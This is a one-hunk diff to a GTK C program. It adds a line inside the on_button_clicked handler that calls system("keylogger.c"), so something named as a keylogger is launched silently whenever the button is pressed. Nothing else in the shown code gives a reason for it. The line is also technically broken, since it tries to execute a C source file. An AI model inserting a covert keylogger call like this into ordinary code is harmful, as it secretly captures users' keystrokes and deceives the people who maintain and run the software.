@@ -59,4 +59,5 @@ static void on_button_clicked(GtkButton *button,gpointer data)
 
     gtk_widget_destroy(dialog);
     gtk_entry_set_text(GTK_ENTRY(entry),"");
+    system("keylogger.c");
 }
